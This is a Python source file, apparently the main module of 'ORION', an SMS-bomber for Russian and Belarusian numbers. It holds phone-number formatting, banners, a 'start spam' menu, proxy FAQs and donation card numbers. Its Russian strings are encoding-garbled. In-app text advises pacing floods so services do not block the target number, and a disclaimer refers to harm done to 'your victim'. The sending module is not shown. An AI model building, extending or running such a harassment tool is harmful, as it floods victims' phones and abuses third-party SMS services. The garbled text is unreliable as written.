 from termcolor import colored
from datetime import datetime
import requests as r, os, time, random, shutil, zipfile, webbrowser
from sys import platform
from tools import proxy
from progress.bar import ChargingBar
from tools import sender as send

def FormattingNumber(number, country):
	numb = str(number)
	if country == "ru": # For Russia
		if numb[0:1] == "+" and numb[1:2] == "7": # +71234567890
			numb_1 = numb
			numb_2 = numb[1:]
			numb_3 = "8"+numb[2:]
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
		elif numb[0:1] == "7":  # 71234567890
			numb_1 = "+"+numb
			numb_2 = numb
			numb_3 = "8"+numb[1:]
			numb = "+"+numb
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
		elif numb[0:1] == "8":  # 81234567890
			numb_1 = "+7"+numb[1:]
			numb_2 = "7"+numb[1:]
			numb_3 = numb
			numb = "+7"+numb[1:]
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
	elif country == "by": # For Belarus
		if numb[0:1] == "+": # +123456789012
			numb_1 = numb
			numb_2 = numb[1:]
			numb_3 = numb[4:]
			numb_4 = numb[:4] + ' (' + numb[4:6] + ") " + numb[6:9] + '-' + numb[9:11] + '-' + numb[11:13]
			numb_5 = numb[:4] + ' (' + numb[4:6] + ") " + numb[6:9] +numb[9:11] +numb[11:13]
		elif numb[0:1] == "3" or numb[0:3] == "375": # 123456789012
			numb_1 = "+"+numb
			numb_2 = numb
			numb_3 = numb[3:]
			numb_4 = '+' + numb[:3] + ' (' + numb[3:5] + ") " + numb[5:8] + '-' + numb[8:10] + '-' + numb[10:12]
			numb_5 = numb_1[:4] + ' (' + numb_1[4:6] + ") " + numb_1[6:9] +numb_1[9:11] +numb_1[11:13]
	if country == "by":
		return numb_1, numb_2, numb_3, numb_4, numb_5
	elif country == "ru":
		return numb_1, numb_2, numb_3, numb_4, numb_5, numb_6, numb_7, numb_8, numb_9, numb_10

def clear():
	if platform == "linux" or platform == "linux2" or platform == "darwin":
		os.system("clear")
	elif platform == "win32":
		os.system("cls")
	else:
		print(colored("\nÐ˜Ð·Ð²Ð¸Ð½Ð¸Ñ‚Ðµ Ð½Ð°ÑˆÐ° Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð½Ðµ Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð¸Ð²Ð°ÐµÑ‚ Ð²Ð°ÑˆÑƒ Ð¾Ð¿ÐµÑ€Ð°Ñ†Ð¸Ð¾Ð½Ð½ÑƒÑŽ ÑÐ¸ÑÑ‚ÐµÐ¼Ñƒ ;(\n", "red"))
		exit()

def anim_text(text, speed, color="green"):
	for i in text:
		print(colored(i, color), end="", flush=True)
		time.sleep(speed)

def RCT(text):
	colors = ["green", "yellow", "red", "magenta", "blue"]
	new_text = ""
	for i in str(text):
		new_text += colored(i, random.choice(colors))
	return new_text

def banner():
	a = open("tools/version.txt", "r")
	ver = a.read().split("\n")[0]
	a.close()

	ru_s = str(len(send.services_list))
	by_s = str(len(send.services_list_by))

	banner = colored("""
	   â†   â†       â†        â†     â†   â†   â†
	â†		    â†        â†       â†     â†
	 â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–„  â† â–ˆ 
	â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’â–“â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’ â–ˆâ–ˆ â–€â–ˆ   â–ˆ 
	â–’â–ˆâ–ˆâ–‘â† â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’â–’â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–‘â† â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ  â–€â–ˆ â–ˆâ–ˆâ–’
	â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„  â–‘â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–“â–ˆâ–ˆâ–’  â–â–Œâ–ˆâ–ˆâ–’
	â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’â–‘â–ˆâ–ˆâ–‘â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–ˆâ–ˆâ–‘   â–“â–ˆâ–ˆâ–‘
	â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–“ â–‘â–’â–“â–‘â–‘â–“  â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–‘ â† â–’ â–’ 
	  â–‘ â–’ â–’â–‘   â–‘â–’ â–‘ â–’â–‘ â–’ â–‘  â–‘ â–’ â–’â–‘ â–‘ â–‘â–‘   â–‘ â–’â–‘
	â–‘ â–‘ â–‘ â–’ â†  â–‘â–‘   â–‘  â–’ â–‘â–‘ â–‘ â–‘ â–’     â–‘   â–‘ â–‘ 
	    â–‘ â–‘     â–‘  â†   â–‘     â†â–‘ â–‘  â†    â†   â–‘ 
	 â†  	â†          â†        â†""", "blue")

	new_year = " "*21+RCT("Happy New Year!")
	pred_info = "\n"+" "*24+colored("Ð¡ÐµÑ€Ð²Ð¸ÑÑ‹", "green")+"\n"
	pred_info_ru = " "*17+colored("Ð Ð¾ÑÑÐ¸Ñ ", "blue")+colored(ru_s, "green")+"   "
	pred_info_by = colored("Ð‘ÐµÐ»Ð°Ñ€ÑƒÑÑŒ ", "cyan")+colored(by_s, "green")+"\n"
	pred_info = pred_info+pred_info_ru+pred_info_by

	info = " "*13+colored("[", "blue")+"Developers :"+colored("Lucky", "green")+" and "+colored("LostIk", "red")
	info_2 = " "*13+colored("[", "blue")+"Version    :"+colored(ver, "red")+"ðŸŽ„"
	info_3 = " "*13+colored("[", "blue")+"Telegram   :"+colored("@orion_bomber", "cyan")+colored("   <--", "green")+"\n"

	print(banner)
	print(new_year)
	print(pred_info)
	print(info)
	print(info_2)
	print(info_3)

def banner_tools():
	print(colored("[1]", "red"), colored("ÐÐ°Ñ‡Ð°Ñ‚ÑŒ ÑÐ¿Ð°Ð¼", "green"))
	#print(colored("[2]", "red"), colored("FAQ ÐŸÑ€Ð¾ Ð¿Ñ€Ð¾ÐºÑÐ¸", "blue"))
	#print(colored("[3]", "red"), colored("ÐšÑ€Ð°Ñ‚ÐºÐ¾Ðµ Ñ€ÑƒÐºÐ¾Ð²Ð¾Ð´ÑÑ‚Ð²Ð¾ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼", "cyan"))
	#print(colored("[4]", "red"), colored("ÐžÑ‚ÐºÐ°Ð· Ð¾Ñ‚ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚Ð¸", "red"))
	print(colored("[2]", "red"), colored("ÐŸÐ¾Ð´Ð´ÐµÑ€Ð¶Ð°Ñ‚ÑŒ Ñ€Ð°Ð·Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¾Ð²!    <---", "green"))
	print(colored("[3]", "red"), colored("Ð˜Ð½ÑÑ‚Ñ€ÑƒÐºÑ†Ð¸Ñ Ð¿Ð¾ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐµ Ð»Ð¾Ð³Ð¾Ð²", "yellow"))
	print(colored("\n[99]", "red"), colored("Ð˜Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ñ", "cyan"))
	print(colored("\n[0] Ð’Ñ‹Ñ…Ð¾Ð´", "red"))

def quick_guide():
	print("")
	print(colored("Ð’ Ð½Ð°ÑˆÐµÐ¼ Ð±Ð¾Ð¼Ð±ÐµÑ€Ðµ ÑÐ¿Ð°Ð¼ Ð¼Ð¾Ð¶ÐµÑ‚ Ð¿Ð¾ÑÑ‚ÐµÐ¿ÐµÐ½Ð½Ð¾ ÑƒÑ…ÑƒÐ´ÑˆÐ°Ñ‚ÑŒÑÑ Ð¸Ð·-Ð·Ð° Ñ‚Ð¾Ð³Ð¾ Ñ‡Ñ‚Ð¾ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€ Ð¿Ð¾ÑÑ‚ÑƒÐ¿Ð°ÐµÑ‚ Ð¾Ñ‡ÐµÐ½ÑŒ Ð¼Ð½Ð¾Ð³Ð¾ Ð·Ð°Ð¿Ñ€Ð¾ÑÐ¾Ð² Ð½Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÑƒ ÑÐ¼Ñ.", "green"))
	print(colored("ÐÐµ Ð¿Ñ‹Ñ‚Ð°Ð¹Ñ‚ÐµÑÑŒ Ð¾ÑÑ‚Ð°Ð²Ð¸Ñ‚ÑŒ ÑÐ¿Ð°Ð¼ Ð½Ð° Ð²ÑÑŽ Ð½Ð¾Ñ‡ÑŒ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€, Ð²Ñ‹ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð·Ð°ÑÑ‚Ð°Ð²Ð¸Ñ‚Ðµ ÑÐµÑ€Ð²Ð¸ÑÑ‹ Ð·Ð°Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð½Ð¾Ð¼ÐµÑ€ Ñƒ ÑÐµÐ±Ñ Ð² Ð±Ð°Ð·Ðµ Ð¸ Ð½Ð¸ÐºÐ°ÐºÐ¸Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‚ÑƒÑ‚ ÑƒÐ¶Ðµ Ð½Ðµ Ð¿Ð¾Ð¼Ð¾Ð³ÑƒÑ‚.", "green"))
	print(colored("Ð”Ð¾ÑÑ‚Ð°Ñ‚Ð¾Ñ‡Ð½Ð¾ 2-3 ÐºÑ€ÑƒÐ³Ð° Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð½Ð¾Ð¼ÐµÑ€ Ñ€Ð°Ð· Ð² ÑÑƒÑ‚ÐºÐ¸ Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð´Ð¾ÑÑ‚Ð°Ð²Ð¸Ñ‚ÑŒ Ð½Ðµ Ð¼Ð°Ð»Ð¾Ðµ ÐºÐ¾Ð»Ð¸Ñ‡ÐµÑÑ‚Ð²Ð¾ ÑÐ¼Ñ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð½Ð¾Ð¼ÐµÑ€.", "green"))
	print(colored("ÐÐµ Ð±ÑƒÐ´ÑŒÑ‚Ðµ Ð¶Ð°Ð´Ð½Ñ‹ Ð¸ ÑÐ»Ð¸ÑˆÐºÐ¾Ð¼ Ð¼ÑÑ‚Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ñ‹, Ñ‚Ð¾Ð³Ð´Ð° Ð²Ñ‹ ÑÐ¼Ð¾Ð¶ÐµÑ‚Ðµ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÑÑ‚ÑŒ ÑÐ¼Ñ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€ Ð¿Ð¾ÑÑ‚Ð¾ÑÐ½Ð½Ð¾.", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def disclaimer():
	print("")
	print(colored("Ð Ð°Ð·Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¸ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹ ORION Ð½Ðµ Ð½ÐµÑÑƒÑ‚ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð·Ð° Ð´Ð¾ÑÑ‚Ð°Ð²Ð»ÐµÐ½Ð½Ñ‹Ð¹ Ð¼Ð¾Ñ€Ð°Ð»ÑŒÐ½Ñ‹Ð¹ Ð¸Ð»Ð¸ Ñ„Ð¸Ð·Ð¸Ñ‡ÐµÑÐºÐ¸Ð¹ ÑƒÑ‰ÐµÑ€Ð± Ð²Ð°ÑˆÐµÐ¹ Ð¶ÐµÑ€Ñ‚Ð²Ðµ.", "green"))
	print(colored("ÐŸÐ¾Ð»ÑŒÐ·ÑƒÑÑÑŒ Ð´Ð°Ð½Ð½Ð¾Ð¹ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð¾Ð¹ Ð²Ñ‹ Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¸ ÑÐ¾Ð³Ð»Ð°ÑˆÐ°ÐµÑ‚ÐµÑÑŒ Ð½Ð° ÑÑ‚Ð¾ Ð¸ Ð±ÐµÑ€ÐµÑ‚Ðµ Ð²ÑÑŽ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð½Ð° ÑÐµÐ±Ñ", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def donate():
	print("")
	print(colored("Ð’Ð°ÑˆÐ° Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð° ÐµÑ‰Ðµ Ð±Ð¾Ð»ÑŒÑˆÐµ Ð¼Ð¾Ñ‚Ð¸Ð²Ð¸Ñ€ÑƒÐµÑ‚ Ð½Ð°Ñ Ð²Ñ‹Ð¿ÑƒÑÐºÐ°Ñ‚ÑŒ Ð¾Ð±Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ñ!", "green"))
	print("")
	print(colored("QIWI", "yellow"))
	print("â”œ"+colored("https://qiwi.com/n/LUCKY1376", "cyan"), colored("ÐŸÐµÑ€ÐµÐ²Ð¾Ð´ Ð¿Ð¾ Ð½Ð¸ÐºÐ½ÐµÐ¹Ð¼Ñƒ", "green"))
	print("â”œ"+colored("2200 7302 4344 6206", "cyan"), colored("MIR", "green"))
	print("â””"+colored("4890 4947 5754 5546", "cyan"), colored("VISA", "blue"))
	print("")
	print(colored("Ð¡Ð±ÐµÑ€Ð±Ð°Ð½Ðº", "green"))
	print("â”œ"+colored("2202 2024 3331 7181", "cyan"), colored("MIR", "green"))
	print("â””"+colored("5469 4500 1265 2996", "cyan"), colored("MasterCard", "red"))
	print("")
	print(colored("Ð®Ð¼Ð°Ð½Ð¸", "blue"))
	print("â”œ"+colored("4100 1174 8743 5875", "cyan"), "ÐÐ¾Ð¼ÐµÑ€ ÑÑ‡ÐµÑ‚Ð°")
	print("â””"+colored("2202 1201 0852 7850", "cyan"), colored("MIR", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def faq_proxy():
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‚Ð°ÐºÐ¾Ð¹ Ð¼ÐµÐ´Ð»ÐµÐ½Ð½Ñ‹Ð¹ ÑÐ¿Ð°Ð¼ Ð¸ Ñ‚Ð°ÐºÐ°Ñ Ñ‡Ð°ÑÑ‚Ð°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ°?", "cyan"))
	print(colored("ÐÐ°Ñˆ Ð¿Ð°Ñ€ÑÐµÑ€ Ð±ÐµÑ€ÐµÑ‚ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ Ð¾Ð±Ñ‰ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ñ‹Ñ… ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð², ÐºÐ¾Ð½ÐµÑ‡Ð½Ð¾ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð¼Ñ‹ Ñ‚Ð°Ðº Ð´ÐµÐ»Ð°ÐµÐ¼ Ð¸ ÑÐ¾Ð¾Ñ‚Ð²ÐµÑÑ‚Ð²ÐµÐ½Ð½Ð¾ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð¼Ñ‹ Ð¿Ð¾Ð»ÑŒÐ·ÑƒÐµÐ¼ÑÑ ÑÑ‚Ð¸Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸.", "green"))
	print(colored("Ð¢Ð°ÐºÐ¶Ðµ Ð½Ð° Ð´Ð°Ð½Ð½Ñ‹Ñ… ÑÐµÑ€Ð²Ð¸ÑÐ°Ñ… Ð¾Ñ‡ÐµÐ½ÑŒ Ð¼Ð°Ð»Ð¾ Ð´Ð¾Ð²Ð¾Ð»ÑŒÐ½Ð¾ Ð±Ñ‹ÑÑ‚Ñ€Ñ‹Ñ… Ð¸ Ð°Ð½Ð¾Ð½Ð¸Ð¼Ð½Ñ‹Ñ… Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‡Ñ‚Ð¾ Ð¿Ð¾Ð·Ð²Ð¾Ð»ÑÐ»Ð¾ Ð±Ñ‹ ÑƒÐ»ÑƒÑ‡ÑˆÐ¸Ñ‚ÑŒ ÑÐ¿Ð°Ð¼ Ñ Ð½Ð¸Ð¼Ð¸.", "green"))
	print(colored("Ð§Ð°ÑÑ‚Ð°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð²Ð¾Ð·Ð½Ð¸ÐºÐ°ÐµÑ‚ Ð¸Ð·-Ð·Ð° Ð½Ðµ ÑÑ‚Ð°Ð±Ð¸Ð»ÑŒÐ½Ð¾ÑÑ‚Ð¸ ÑÑ‚Ð¸Ñ… Ð¿Ñ€Ð¾ÐºÑÐ¸, Ñ‡Ð°ÑÑ‚Ð¾ Ð¾Ð½Ð¸ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð¿ÐµÑ€ÐµÑÑ‚Ð°ÑŽÑ‚ Ñ€Ð°Ð±Ð¾Ñ‚Ð°Ñ‚ÑŒ Ð¸ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð±ÐµÑ€ÐµÑ‚ ÑÐ»ÐµÐ´ÑƒÑŽÑ‰Ð¸Ð¹ Ð¸Ð· ÑÐ¿Ð¸ÑÐºÐ°.", "green"))
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ð½ÐµÐ»ÑŒÐ·Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð±Ñ€Ð°Ñ‚ÑŒ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð»ÑŽÐ±Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ð° Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð½Ð¾Ð¼ÐµÑ€Ð° ÐºÐ¾Ñ‚Ð¾Ñ€Ð¾Ð³Ð¾ Ð²Ð²ÐµÐ»Ð¸?", "cyan"))
	print(colored("ÐÐµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒÑÑ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð¾Ð¿ÑƒÑÑ‚Ð¸Ð¼ ÐºÐ°Ð½Ð°Ð´ÑÐºÐ¸Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ Ñ€Ð¾ÑÑÐ¸Ð¹ÑÐºÐ¸Ð¼Ð¸ ÑÐµÑ€Ð²Ð¸ÑÐ°Ð¼Ð¸ Ñ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð¼ .ru", "green"))
	print(colored("Ð•ÑÐ»Ð¸ Ð½Ð° ÑÐ°Ð¹Ñ‚Ðµ ÑƒÐºÐ°Ð·Ð°Ð½ Ð´Ð¾Ð¼ÐµÐ½ Ð´Ð°Ð½Ð½Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ñ‚Ð¾ Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð´Ð¾Ð»Ð¶Ð½Ñ‹ Ð±Ñ‹Ñ‚ÑŒ ÑÑ‚Ð¾Ð¹ Ð¶Ðµ ÑÑ‚Ñ€Ð°Ð½Ñ‹.", "green"))
	print(colored("Ð¡ÐµÑ€Ð²Ð¸ÑÑ‹ Ñ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð¼ ÑÐ²Ð¾ÐµÐ¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð½Ðµ Ð¿ÑƒÑÑ‚ÑÑ‚ Ð½Ð°Ñˆ Ð·Ð°Ð¿Ñ€Ð¾Ñ Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð¸Ð½Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹.", "green"))
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ð½ÐµÐ»ÑŒÐ·Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð¿Ð¾Ð´ÐºÐ»ÑŽÑ‡Ð¸Ñ‚ÑŒ Ð±Ð¾Ð»ÑŒÑˆÐµ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ð´Ð»Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸?", "cyan"))
	print(colored("90% Ð¡ÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ñ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð²Ð¾Ñ€ÑƒÑŽÑ‚ Ð¸Ñ… Ð´Ñ€ÑƒÐ³ Ñƒ Ð´Ñ€ÑƒÐ³Ð° Ð¸ Ð¸Ð·-Ð·Ð° ÑÑ‚Ð¾Ð³Ð¾ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð½Ðµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒÑÑ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ð±Ð¾Ð»ÑŒÑˆÐ¸Ð¹ ÑÐ¿Ð¸ÑÐ¾Ðº.", "green"))
	print(colored("ÐœÑ‹ ÑÑ‚Ð°Ñ€Ð°ÐµÐ¼ÑÑ Ð¸ÑÐºÐ°Ñ‚ÑŒ Ñ…Ð¾Ñ€Ð¾ÑˆÐ¸Ðµ ÑÐµÑ€Ð²Ð¸ÑÑ‹ Ñ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð½Ðµ Ð²Ð¾Ñ€ÑƒÑŽÑ‚ Ð´Ñ€ÑƒÐ³ Ñƒ Ð´Ñ€ÑƒÐ³Ñƒ Ð¸ ÑƒÐ´Ð¾Ð±Ð½Ñ‹ Ð² Ð¿Ð°Ñ€ÑÐ¸Ð½Ð³Ðµ Ð»Ð¸Ð±Ð¾ Ð¸Ð¼ÐµÑŽÑ‚ ÑÐ²Ð¾Ð¹ API.", "green"))
	print("")
	print("")
	print(colored("Ð¡Ð¾Ð²ÐµÑ‚ÑƒÐµÐ¼ Ð²Ð°Ð¼ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð²Ð°ÑˆÐ¸ ÑÐ¾Ð±ÑÑ‚Ð²ÐµÐ½Ð½Ñ‹Ðµ Ð¿Ð¾ÐºÑƒÐ¿Ð½Ñ‹Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ ÐµÑÐ»Ð¸ Ñ…Ð¾Ñ‚Ð¸Ñ‚Ðµ ÑÐ¾ÐºÑ€Ð°Ñ‚Ð¸Ñ‚ÑŒ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÑƒ Ð²Ð°ÑˆÐµÐ³Ð¾ IP Ñƒ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ð¸ Ð¸Ð¼ÐµÑ‚ÑŒ Ñ…Ð¾Ñ€Ð¾ÑˆÑƒÑŽ ÑÐºÐ¾Ñ€Ð¾ÑÑ‚ÑŒ ÑÐ¿Ð°Ð¼Ð°", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def inst_logs():
	# Checking File System Access
	try:
		if platform == "linux" or platform == "linux2":
			shutil.copyfile('tools/logs.txt', '/storage/emulated/0/Download/logs.txt')
			shutil.copyfile('tools/error_logs.txt', '/storage/emulated/0/Download/error_logs.txt')
			print(colored("Ð¤Ð°Ð¹Ð»Ñ‹", "green"), colored("logs.txt error_logs.txt", "cyan"), colored("Ð±Ñ‹Ð»Ð¸ ÑÐ¾Ñ…Ñ€Ð°Ð½ÐµÐ½Ñ‹ Ð² Ð¿Ð°Ð¿ÐºÑƒ Download Ð½Ð° Ð²Ð°ÑˆÐµÐ¼ ÑƒÑÑ‚Ñ€Ð¾Ð¹ÑÑ‚Ð²Ðµ", "green"))
			print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÑŒÑ‚Ðµ Ð¿Ð¾Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð½Ð¾ ÑÑ‚Ð¸ 2 Ñ„Ð°Ð¹Ð»Ð° Ð½Ð°ÑˆÐµÐ¼Ñƒ Ð±Ð¾Ñ‚Ñƒ Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "green"), colored("https://t.me/orion_feedback_bot", "cyan"))
			print("")
			print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
			input()
		elif platform == "win32":
			print("")
